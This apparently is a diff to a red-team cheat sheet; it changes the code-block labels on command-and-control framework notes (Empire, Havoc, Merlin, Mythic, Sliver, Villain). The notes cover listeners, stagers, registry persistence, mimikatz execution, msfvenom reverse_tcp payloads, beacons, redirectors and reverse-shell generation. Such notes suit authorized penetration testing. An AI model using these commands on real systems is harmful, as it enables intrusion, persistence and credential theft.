@@ -54,25 +54,25 @@
 
 ### Prerequisites
 
-```c
+```console
 $ sudo apt-get install docker docker-compose
 ```
 
 ### Installation
 
-```c
+```console
 $ git clone --recurse-submodules https://github.com/cobbr/Covenant
 $ cd Covenant/Covenant
 $ docker build -t covenant .
 ```
 
-```c
+```console
 $ docker run -it -p 7443:7443 -p 80:80 -p 443:443 --name covenant -v /PATH/TO/Covenant/Covenant/Data:/app/Data covenant
 ```
 
 or
 
-```c
+```console
 $ docker run -d -it -p 7443:7443 -p 80:80 -p 443:443 --name covenant -v /PATH/TO/Covenant/Covenant/Data:/app/Data covenant
 ```
 
@@ -80,19 +80,19 @@ $ docker run -d -it -p 7443:7443 -p 80:80 -p 443:443 --name covenant -v /PATH/TO
 
 ### Stop Covenant
 
-```c
+```console
 $ docker stop covenant
 ```
 
 ### Restart Covenant
 
-```c
+```console
 $ docker start covenant -ai
 ```
 
 ### Remove and Restart Covenant
 
-```c
+```console
 $ ~/Covenant/Covenant > docker rm covenant
 $ ~/Covenant/Covenant > docker run -it -p 7443:7443 -p 80:80 -p 443:443 --name covenant -v /PATH/TO/Covenant/Covenant/Data:/app/Data covenant --username AdminUser --computername 0.0.0.0
 ```
@@ -103,18 +103,18 @@ $ ~/Covenant/Covenant > docker run -it -p 7443:7443 -p 80:80 -p 443:443 --name c
 
 ### Installation
 
-```c
+```console
 $ git clone --recursive https://github.com/BC-SECURITY/Empire.git
 $ cd Empire
 $ ./setup/checkout-latest-tag.sh
 $ ./setup/install.sh
 ```
 
-```c
+```console
 $ ./ps-empire server
 ```
 
-```c
+```console
 $ ./ps-empire client
 ```
 
@@ -124,7 +124,7 @@ $ ./ps-empire client
 
 ### Common Commands
 
-```c
+```console
 (Empire) > listeners                      // list current running listeners
 (Empire) > uselistener                    // configure listener
 (Empire) > agents                         // list available agents
@@ -169,7 +169,7 @@ $ ./ps-empire client
 
 ### Setup HTTP Listener
 
-```c
+```console
 (Empire) > listeners http
 (Empire: listeners/http) > info
 (Empire: listeners/http) > set Name <NAME>
@@ -180,7 +180,7 @@ $ ./ps-empire client
 
 ### Setup Stager
 
-```c
+```console
 (Empire: listeners) > usestager multi/bash
 (Empire: listeners/multi/bash) > set Listener <NAME>
 (Empire: listeners/multi/bash) > set OutFile /PATH/TO/FILE/<FILE>.sh
@@ -189,7 +189,7 @@ $ ./ps-empire client
 
 ### Setup Persistence Measures
 
-```c
+```console
 (Empire: <NAME>) > usemodule powershell/persistence/elevated/registry
 (Empire: <NAME>/powershell/persistence/elevated/registry) > set Listener <NAME>
 (Empire: <NAME>/powershell/persistence/elevated/registry) > run
@@ -197,7 +197,7 @@ $ ./ps-empire client
 
 ## Hak5 Cloud C2
 
-```c
+```console
 $ ./c2-3.3.0_amd64_linux -hostname 127.0.0.1 -listenip 127.0.0.1
 ```
 
@@ -209,7 +209,7 @@ $ ./c2-3.3.0_amd64_linux -hostname 127.0.0.1 -listenip 127.0.0.1
 
 ### Python Environment
 
-```c
+```console
 $ sudo apt-get install build-essential
 $ sudo add-apt-repository ppa:deadsnakes/ppa
 $ sudo apt-get update
@@ -218,7 +218,7 @@ $ sudo apt-get install python3.10 python3.10-dev
 
 ### Prerequisites
 
-```c
+```console
 $ sudo apt-get install -y git build-essential apt-utils cmake libfontconfig1 libglu1-mesa-dev libgtest-dev libspdlog-dev libboost-all-dev libncurses5-dev libgdbm-dev libssl-dev libreadline-dev libffi-dev libsqlite3-dev libbz2-dev mesa-common-dev qtbase5-dev qtchooser qt5-qmake qtbase5-dev-tools libqt5websockets5 libqt5websockets5-dev qtdeclarative5-dev golang-go qtbase5-dev libqt5websockets5-dev libspdlog-dev python3-dev libboost-all-dev mingw-w64 nasm
 ```
 
@@ -226,7 +226,7 @@ $ sudo apt-get install -y git build-essential apt-utils cmake libfontconfig1 lib
 
 #### Building Client
 
-```c
+```console
 user@host:/opt$ sudo git clone https://github.com/HavocFramework/Havoc.git
 user@host:/opt$ cd Havoc/Client
 user@host:/opt/Havoc/Client$ make 
@@ -235,7 +235,7 @@ user@host:/opt/Havoc/Client$ ./Havoc
 
 #### Building Teamserver
 
-```c
+```console
 user@host:/opt/Havoc/Teamserver$ go mod download golang.org/x/sys
 user@host:/opt/Havoc/Teamserver$ go mod download github.com/ugorji/go
 user@host:/opt/Havoc/Teamserver$ ./Install.sh
@@ -246,13 +246,13 @@ user@host:/opt/Havoc/Teamserver$ sudo ./teamserver server --profile ./profiles/h
 
 ### Start Teamserver
 
-```c
+```console
 user@host:/opt/Havoc/Teamserver$ sudo ./teamserver server --profile ./profiles/havoc.yaotl -v --debug
 ```
 
 ### Start Client
 
-```c
+```console
 user@host:/opt/Havoc/Client$ ./Havoc
 ```
 
@@ -268,7 +268,7 @@ user@host:/opt/Havoc/Client$ ./Havoc
 
 ### Installation
 
-```c
+```console
 $ mkdir /opt/merlin;cd /opt/merlin
 $ wget https://github.com/Ne0nd0g/merlin/releases/latest/download/merlinServer-Linux-x64.7z
 $ 7z x merlinServer-Linux-x64.7z
@@ -278,11 +278,11 @@ $ ./data/bin/merlinCLI-Linux-x64
 
 ### Service Configuration
 
-```c
+```console
 /etc/systemd/system/merlin.service
 ```
 
-```c
+```console
 [Unit]
 Description=Merlin
 
@@ -294,14 +294,14 @@ Type=Simple
 WantedBy=multi-user.target
 ```
 
-```c
+```console
 $ systemctl enable merlin.service
 $ systemctl start merlin.service
 ```
 
 ### Common Commands
 
-```c
+```console
 Merlin» help
 Merlin» main
 Merlin» ! <COMMAND>
@@ -319,7 +319,7 @@ Merlin» remove
 
 ### Grouping
 
-```c
+```console
 Merlin» group add <AGENT> <GROUP>
 Merlin» list <GROUP> 
 Merlin» remove <AGENT> <GROUP>
@@ -331,7 +331,7 @@ Merlin» remove <AGENT> <GROUP>
 
 #### Common Commands
 
-```c
+```console
 Merlin[listeners]» list
 Merlin[listeners][e2d9e800-78cc-4347-a232-ce767db508cd]» status
 Merlin[listeners][e2d9e800-78cc-4347-a232-ce767db508cd]» start
@@ -341,7 +341,7 @@ Merlin[listeners][e2d9e800-78cc-4347-a232-ce767db508cd]» delete
 
 #### Usage
 
-```c
+```console
 Merlin» listeners
 Merlin[listeners]» use https
 Merlin[listeners][HTTPS]» info
@@ -362,14 +362,14 @@ Merlin[listeners]» interact e2d9e800-78cc-4347-a232-ce767db508cd
 
 #### Agent Installation
 
-```c
+```console
 $ go install github.com/Ne0nd0g/merlin-agent@latest
 $ go install github.com/Ne0nd0g/merlin-agent-dll@latest
 ```
 
 #### Agent Download
 
-```c
+```console
 $ wget https://github.com/Ne0nd0g/merlin-agent/releases/download/v2.3.0/merlinAgent-Windows-x64.7z
 $ wget https://github.com/Ne0nd0g/merlin-agent/releases/download/v2.3.0/merlinAgent-Linux-x64.7z
 $ wget https://github.com/Ne0nd0g/merlin-agent/releases/download/v2.3.0/merlinAgent-Darwin-x64.7z
@@ -378,7 +378,7 @@ $ wget https://github.com/Ne0nd0g/merlin-agent-dll/releases/download/v2.2.0/merl
 
 #### Build Commands
 
-```c
+```console
 $ make windows
 $ make linux
 $ make darwin
@@ -394,31 +394,31 @@ Please note that you have to be inside the `agent folder` for building agents.
 
 ##### Basic Build with no Customization
 
-```c
+```console
 $ make windows DIR="./output"
 ```
 
 ###### Sample Output
 
-```c
+```console
 export GOOS=windows GOARCH=amd64;go build -trimpath -ldflags '-s -w -X "main.auth=opaque" -X "main.addr=127.0.0.1:4444" -X "main.transforms=jwe,gob-base" -X "main.listener=" -X "github.com/Ne0nd0g/merlin-agent/v2/core.Build=f0624a3082928d01eaa86a0fb101b0d1d72cde02" -X "main.protocol=h2" -X "main.url=https://127.0.0.1:443" -X "main.host=" -X "main.psk=merlin" -X "main.secure=false" -X "main.sleep=30s" -X "main.proxy=" -X "main.useragent=Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/40.0.2214.85 Safari/537.36" -X "main.headers=" -X "main.skew=3000" -X "main.padding=4096" -X "main.killdate=0" -X "main.maxretry=7" -X "main.parrot=" -H=windowsgui -buildid=' -gcflags=all=-trimpath= -asmflags=all=-trimpath= -o ./output/merlinAgent-Windows-x64.exe ./main.go
 ```
 
 ##### Custom Build with customized Parameters
 
-```c
+```console
 $ make windows ADDR="<LHOST>" DIR="./output" AUTH="opaque" LISTENER="732e296e-7856-4914-961b-b4ba74972b54" KILLDATE="0" RETRY="10" PAD="4096" PROTO="h2" PSK="<PSK>" SKEW="3000" SLEEP="10s" URL="https://<LHOST>:<LPORT>/" USERAGENT="Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/40.0.2214.85 Safari/537.36"
 ```
 
 ###### Sample Output
 
-```c
+```console
 export GOOS=windows GOARCH=amd64;go build -trimpath -ldflags '-s -w -X "main.auth=opaque" -X "main.addr=<LHOST>" -X "main.transforms=jwe,gob-base" -X "main.listener=732e296e-7856-4914-961b-b4ba74972b54" -X "github.com/Ne0nd0g/merlin-agent/v2/core.Build=f0624a3082928d01eaa86a0fb101b0d1d72cde02" -X "main.protocol=h2" -X "main.url=https://<LHOST>:<LPORT>/" -X "main.host=" -X "main.psk=<PSK>" -X "main.secure=false" -X "main.sleep=10s" -X "main.proxy=" -X "main.useragent=Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/40.0.2214.85 Safari/537.36" -X "main.headers=" -X "main.skew=3000" -X "main.padding=4096" -X "main.killdate=0" -X "main.maxretry=10" -X "main.parrot=" -H=windowsgui -buildid=' -gcflags=all=-trimpath= -asmflags=all=-trimpath= -o ./output/merlinAgent-Windows-x64.exe ./main.go
 ```
 
 #### Common Commands
 
-```c
+```console
 Merlin» interact <AGENT>
 Merlin[agent][c1090dbc-f2f7-4d90-a241-86e0c0217786]» checkin
 Merlin[agent][c1090dbc-f2f7-4d90-a241-86e0c0217786]» clear
@@ -450,19 +450,19 @@ Merlin[agent][c1090dbc-f2f7-4d90-a241-86e0c0217786]» exit
 
 ##### Examples
 
-```c
+```console
 Merlin[agent][c1090dbc-f2f7-4d90-a241-86e0c0217786]» env showall
 ```
 
 #### Linux Specific Commands
 
-```c
+```console
 Merlin[agent][c1090dbc-f2f7-4d90-a241-86e0c0217786]» memfd
 ```
 
 #### Windows Specific Commands
 
-```c
+```console
 Merlin[agent][c1090dbc-f2f7-4d90-a241-86e0c0217786]» ps
 Merlin[agent][c1090dbc-f2f7-4d90-a241-86e0c0217786]» pipes
 Merlin[agent][c1090dbc-f2f7-4d90-a241-86e0c0217786]» netstat
@@ -484,7 +484,7 @@ Merlin[agent][c1090dbc-f2f7-4d90-a241-86e0c0217786]» memory
 
 ##### Examples
 
-```c
+```console
 Merlin[agent][c1090dbc-f2f7-4d90-a241-86e0c0217786]» execute-assembly /PATH/TO/BINARY/<BINARY>
 Merlin[agent][c1090dbc-f2f7-4d90-a241-86e0c0217786]» execute-assembly /PATH/TO/BINARY/<BINARY> <OPTION> "C:\\Windows\\System32\\WerFault.exe"
 Merlin[agent][c1090dbc-f2f7-4d90-a241-86e0c0217786]» execute-pe /PATH/TO/BINARY/mimikatz.exe "coffee exit" "C:\\Windows\\System32\\WerFault.exe"
@@ -501,7 +501,7 @@ Merlin[agent][c1090dbc-f2f7-4d90-a241-86e0c0217786]» load-clr v4.0
 
 #### Example Usage
 
-```c
+```console
 Merlin» listeners
 Merlin[listeners]» use https
 Merlin[listeners][HTTPS]» info
@@ -511,36 +511,36 @@ Merlin[listeners][HTTPS]» set PSK <PSK>
 Merlin[listeners][HTTPS]» run
 ```
 
-```c
+```console
 Merlin» sessions
 ```
 
-```c
+```console
 Merlin» interact 2711ef1d-0b53-490d-add9-7ae3c0878b07 
 Merlin[agent][2711ef1d-0b53-490d-add9-7ae3c0878b07]» info
 ```
 
 ##### Fixing Error Message: Orphaned Agent JWT detected. Returning 401 instructing the Agent to generate a self-signed JWT and try again.
 
-```c
+```console
 Merlin[agent][2711ef1d-0b53-490d-add9-7ae3c0878b07]» rev2self
 ```
 
 #### Cloud Fronting
 
-```c
+```console
 $ make linux URL=http://<>DOMAIN/ HOST=<LHOST> PROTO=http PSK=<PSK>
 ```
 
 #### Simple Test Execution
 
-```c
+```console
 $ ./merlinAgent-Linux-x64 -url http://<LHOST>:<LPORT> -psk '<PSK>' -padding 0 -sleep 5s -skew 0 -proto http -v
 ```
 
 ### SOCKS Proxy
 
-```c
+```console
 Merlin» socks list
 Merlin» socks start <PORT> <AGENT>
 Merlin» socks stop <PORT> <AGENT>
@@ -558,7 +558,7 @@ Merlin» socks stop <PORT> <AGENT>
 
 ### Installation
 
-```c
+```console
 $ sudo apt-get install build-essential ca-certificates curl docker.io docker-compose gnupg gpg mingw-w64 g++-mingw-w64 python3-docker
 $ git clone https://github.com/its-a-feature/Mythic.git
 $ cd Mythic/
@@ -567,13 +567,13 @@ $ sudo make
 
 ### Install HTTP C2 Profile
 
-```c
+```console
 $ sudo ./mythic-cli install github https://github.com/MythicC2Profiles/http
 ```
 
 ### Install Mythic Agents
 
-```c
+```console
 $ sudo ./mythic-cli install github https://github.com/MythicAgents/apfell.git
 $ sudo ./mythic-cli install github https://github.com/MythicAgents/Apollo.git
 $ sudo ./mythic-cli install github https://github.com/MythicAgents/arachne.git
@@ -590,7 +590,7 @@ $ sudo ./mythic-cli install github https://github.com/MythicAgents/poseidon.git
 
 Check the `.env` file to grab the credentials for the `mythic_admin` user.
 
-```c
+```console
 $ cat .env
 ```
 
@@ -600,7 +600,7 @@ $ cat .env
 
 ### Socat
 
-```c
+```console
 $ socat TCP4-LISTEN:<LPORT>,fork TCP4:<LHOST>:<LPORT>
 ```
 
@@ -608,13 +608,13 @@ $ socat TCP4-LISTEN:<LPORT>,fork TCP4:<LHOST>:<LPORT>
 
 #### Redirector
 
-```c
+```console
 $ sudo socat tcp-listen:8443,reuseaddr,fork,bind=<LHOST> tcp:127.0.0.1:1234
 ```
 
 #### C2
 
-```c
+```console
 $ ssh -N -R 1234:localhost:8443 -i <SSH_KEY> root@<RHOST>
 ```
 
@@ -632,7 +632,7 @@ $ ssh -N -R 1234:localhost:8443 -i <SSH_KEY> root@<RHOST>
 
 ### Installation
 
-```c
+```console
 $ curl https://sliver.sh/install | sudo bash
 ```
 
@@ -642,7 +642,7 @@ Download the latest `sliver-server` binary and execute it.
 
 > https://github.com/BishopFox/sliver/releases
 
-```c
+```console
 $ ./sliver-server_linux 
 
 Sliver  Copyright (C) 2022  Bishop Fox
@@ -666,23 +666,23 @@ All hackers gain evolve
 [*] Welcome to the sliver shell, please type 'help' for options
 ```
 
-```c
+```console
 [server] sliver > multiplayer
 
 [*] Multiplayer mode enabled!
 ```
 
-```c
+```console
 [server] sliver > generate --http <LHOST> --os windows --arch amd64 --format exe --save /PATH/TO/FOLDER/
 ```
 
-```c
+```console
 [server] sliver > http
 ```
 
 ### Administration
 
-```c
+```console
 sliver > version
 sliver > players
 sliver > armory
@@ -693,35 +693,35 @@ sliver > armory install all
 
 #### Register a new Operator
 
-```c
+```console
 root@c2:~# ./sliver-server operator --name <USERNAME> --lhost 127.0.0.1 --save /home/<USERNAME>/.sliver/configs/<USERNAME>.cfg
 ```
 
-```c
+```console
 root@c2:~/.sliver/configs$ chown <USERNAME>:<USERNAME> *.cfg
 ```
 
-```c
+```console
 username@c2:~/.sliver/configs$ sliver import <USERNAME>.cfg
 ```
 
 #### Register a new Operator directly on the Sliver Server
 
-```c
+```console
 [server] sliver > multiplayer
 ```
 
-```c
+```console
 [server] sliver > new-operator --name <USERNAME> --lhost <LHOST>
 ```
 
-```c
+```console
 username@c2:~/.sliver/configs$ sliver import <USERNAME>.cfg
 ```
 
 #### Kick Operator
 
-```c
+```console
 [server] sliver > kick-operator -n <USERNAME>
 ```
 
@@ -761,24 +761,24 @@ sliver > generate beacon --http <LHOST>?proxy=http://<LHOST>:8080,<LHOST>?driver
 
 #### Profiles
 
-```c
+```console
 sliver > profiles new --mtls <LHOST>:<LPORT> --arch amd64 --format shellcode --skip-symbols <PROFILE>
 sliver > profiles new beacon --mtls <LHOST>:<LPORT> --arch amd64 --format shellcode --skip-symbols <PROFILE>
 ```
 
 #### Listener
 
-```c
+```console
 sliver > stage-listener --url tcp://<LHOST>:<LPORT> --profile <PROFILE>
 ```
 
 ##### Encrypted Listener
 
-```c
+```console
 sliver > stage-listener --url http://<LHOST>:<LPORT> --profile <PROFILE> --aes-encrypt-key D(G+KbPeShVmYq3t --aes-encrypt-iv 8y/B?E(G+KbPeShV
 ```
 
-```c
+```cpp
 using System;
 using System.Collections.Generic;
 using System.IO;
@@ -864,19 +864,19 @@ namespace Sliver_stager
 
 #### Stager
 
-```c
+```console
 sliver > generate stager --lhost <LHOST> --lport <LPORT> --arch amd64 --format c --save /PATH/TO/BINARY/
 ```
 
 #### Examples
 
-```c
+```console
 sliver > profiles new --mtls <LHOST> --os windows --arch amd64 --format shellcode <PROFILE>
 sliver > stage-listener --url http://<LHOST>:<LPORT> --profile <PROFILE>
 sliver > generate stager --lhost <LHOST> --lport <LPORT> --arch amd64 --format c --save /PATH/TO/BINARY/
 ```
 
-```c
+```console
 sliver > profiles new --mtls <LHOST> --os windows --arch amd64 --format shellcode <PROFILE>
 sliver > stage-listener --url http://<LHOST>:<LPORT> --profile <PROFILE> --prepend-size
 sliver > generate stager --lhost <LHOST> --lport <LPORT> --protocol http --format c --save /PATH/TO/BINARY/
@@ -886,23 +886,23 @@ sliver > generate stager --lhost <LHOST> --lport <LPORT> --protocol http --forma
 
 > https://github.com/BishopFox/sliver/issues/1580
 
-```c
+```console
 $ msfvenom LHOST=<LHOST> LPORT=<LPORT> -p windows/x64/meterpreter/reverse_tcp -f c -o /PATH/TO/BINARY/stager.c
 ```
 
 or
 
-```c
+```console
 $ msfvenom -p windows/x64/custom/reverse_winhttp LHOST=<LHOST> LPORT=<LPORT> LURI=/<NAME>.woff -f raw -o /PATH/TO/BINARY/<FILE>.bin
 ```
 
-```c
+```console
 sliver > stage-listener --url http://<LHOST>:<LPORT> --profile <PROFILE> --prepend-size
 ```
 
 ### Common Commands, Implant and Beacon Handling
 
-```c
+```console
 sliver > mtls                                                             // Mutual Transport Layer Security
 sliver > mtls --lport <LPORT>                                             // set MTLS port
 sliver > jobs                                                             // display current jobs
@@ -932,7 +932,7 @@ sliver (NEARBY_LANGUAGE) > execute-shellcode <FILE>.bin uac               // exe
 
 ### Spawning new Sessions
 
-```c
+```console
 sliver (NEARBY_LANGUAGE) > interactive
 sliver (NEARBY_LANGUAGE) > generate --format shellcode --http acme.com --save /PATH/TO/BINARY/
 sliver (NEARBY_LANGUAGE) > execute-shellcode -p <PID> /PATH/TO/BINARY/<FILE>.bin
@@ -940,7 +940,7 @@ sliver (NEARBY_LANGUAGE) > execute-shellcode -p <PID> /PATH/TO/BINARY/<FILE>.bin
 
 ### Port Forwarding
 
-```c
+```console
 sliver (NEARBY_LANGUAGE) > portfwd
 sliver (NEARBY_LANGUAGE) > portfwd add -r <RHOST>:<RPORT>
 sliver (NEARBY_LANGUAGE) > portfwd add -b 127.0.0.1:<RPORT> -r 127.0.0.1:<RPORT>
@@ -950,14 +950,14 @@ sliver (NEARBY_LANGUAGE) > portfwd rm -i <ID>
 
 ### SOCKS Proxy
 
-```c
+```console
 sliver (NEARBY_LANGUAGE) > socks5 start
 sliver (NEARBY_LANGUAGE) > socks5 stop -i 1
 ```
 
 ### Pivoting
 
-```c
+```console
 sliver (NEARBY_LANGUAGE) > pivots tcp
 sliver (NEARBY_LANGUAGE) > generate --tcp-pivot <RHOST>:<RPORT>
 sliver (NEARBY_LANGUAGE) > pivots
@@ -969,7 +969,7 @@ sliver (NEARBY_LANGUAGE) > pivots
 
 ##### Basic VHost Configuration
 
-```c
+```console
 server {
     listen 8443 default_server;
     listen [::]:8443 default_server;
@@ -996,7 +996,7 @@ server {
 
 ##### Cloud Fronting Configuration
 
-```c
+```console
 server {
     listen 80;
     listen [::]:80;
@@ -1059,7 +1059,7 @@ server {
 
 The `iptables` rules should only accept traffic for port `22/TCP` and from the `redirector`.
 
-```c
+```console
 $ /sbin/iptables -F
 $ /sbin/iptables -P INPUT DROP
 $ /sbin/iptables -P OUTPUT ACCEPT
@@ -1074,7 +1074,7 @@ $ /usr/sbin/iptables-save > /root/custom-ip-tables-rules
 
 ##### server.json
 
-```c
+```json
 {
     "daemon_mode": false,
     "daemon": {
@@ -1098,11 +1098,11 @@ $ /usr/sbin/iptables-save > /root/custom-ip-tables-rules
 
 Create a `beacon` for the IP address of the `redirector`.
 
-```c
+```console
 sliver > generate beacon --http <RHOST>:8443 --os windows --arch amd64 --format exe --disable-sgn --seconds 30 --jitter 3 --save /PATH/TO/BINARY/
 ```
 
-```c
+```console
 sliver > http --lport 8443
 ```
 
@@ -1110,13 +1110,13 @@ sliver > http --lport 8443
 
 > https://github.com/t3l3machus/Villain
 
-```c
+```console
 $ python3 Villain.py -p 8001 -x 8002 -n 8003 -f 8004
 ```
 
 ### Common Commands
 
-```c
+```console
 Villain > help
 Villain > connect
 Villain > generate
@@ -1139,7 +1139,7 @@ Villain > exit
 
 ### Generate Payloads
 
-```c
+```console
 Villain > generate payload=windows/netcat/powershell_reverse_tcp lhost=<INTERFACE> encode
 Villain > generate payload=linux/hoaxshell/sh_curl lhost=<INTERFACE> encode
 ```
